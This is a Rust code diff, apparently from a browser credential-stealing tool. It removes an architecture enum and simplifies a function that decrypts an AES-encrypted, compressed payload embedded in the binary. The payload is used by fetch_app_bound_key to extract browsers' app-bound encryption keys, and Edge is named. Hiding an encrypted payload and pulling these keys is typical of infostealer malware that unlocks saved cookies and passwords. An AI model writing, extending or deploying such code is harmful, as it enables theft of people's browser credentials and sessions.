@@ -7,17 +7,6 @@ const OBFUSCATED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payl
 const AES_KEY:   &[u8; 32] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_key.bin"));
 const AES_NONCE: &[u8; 12] = include_bytes!(concat!(env!("OUT_DIR"), "/payload_nonce.bin"));
 
-#[derive(Clone, Copy, PartialEq, Debug)]
-#[allow(dead_code)]
-enum Architecture { X64, X86 }
-
-fn browser_architecture(browser_name: &str) -> Architecture {
-    match browser_name {
-        "Edge" | "Edge Beta" | "Edge Dev" => Architecture::X64,
-        _ => Architecture::X64,
-    }
-}
-
 #[inline(never)]
 fn decrypt_payload(enc: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
     use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};
@@ -27,7 +16,7 @@ fn decrypt_payload(enc: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
 }
 
 #[inline(never)]
-fn get_payload(_arch: Architecture) -> Vec<u8> {
+fn get_payload() -> Vec<u8> {
     let compressed = decrypt_payload(OBFUSCATED_PAYLOAD, AES_KEY, AES_NONCE);
     let mut decoder = DeflateDecoder::new(&compressed[..]);
     let mut decompressed = Vec::new();
@@ -39,8 +28,7 @@ static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
 static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);
 
 pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
-    let arch = browser_architecture(browser_name);
-    let payload = get_payload(arch);
+    let payload = get_payload();
     if payload.is_empty() {
         return None;
     }
